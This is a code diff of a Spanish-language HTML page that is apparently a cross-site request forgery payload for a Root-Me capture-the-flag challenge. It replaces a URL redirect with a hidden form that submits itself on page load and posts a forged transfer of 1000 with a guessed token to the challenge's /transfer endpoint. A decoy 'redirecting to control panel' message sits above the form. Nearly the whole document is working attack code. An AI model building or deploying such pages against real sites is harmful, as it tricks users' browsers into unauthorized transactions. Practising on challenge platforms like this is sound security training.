@@ -1,16 +1,39 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Cargando propuesta comercial...</title>
+</head>
 <body>
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h1>Redirigiendo al panel de control...</h1>
+        <p>Por favor, no cierre esta ventana.</p>
+    </div>
+
     <script>
-        // Si el backend es permisivo, esto funcionará enviando las cookies
-        const victimToken = "6594d3fb4300bf02000000"; // Corregido d3
-        const recipient = "test";
-        const amount = "1000";
+        // Creamos el formulario de ataque
+        var f = document.createElement("form");
+        f.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
+        f.method = "POST";
+
+        // DATOS CORREGIDOS
+        var data = {
+            "token": "6594d3fb4300bf02000000", // Hex exacto de 2024-01-03 04:09:31
+            "recipient": "test",             // TU nombre de usuario
+            "amount": "1000"                 // Monto dentro del límite
+        };
+
+        for (var key in data) {
+            var input = document.createElement("input");
+            input.type = "hidden";
+            input.name = key;
+            input.value = data[key];
+            f.appendChild(input);
+        }
+
+        document.body.appendChild(f);
         
-        const exploitUrl = `https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer?token=${victimToken}&recipient=${recipient}&amount=${amount}`;
-        
-        // Forzamos al bot a navegar a esa URL
-        window.location.href = exploitUrl;
+        // Ejecución inmediata
+        f.submit();
     </script>
 </body>
 </html>
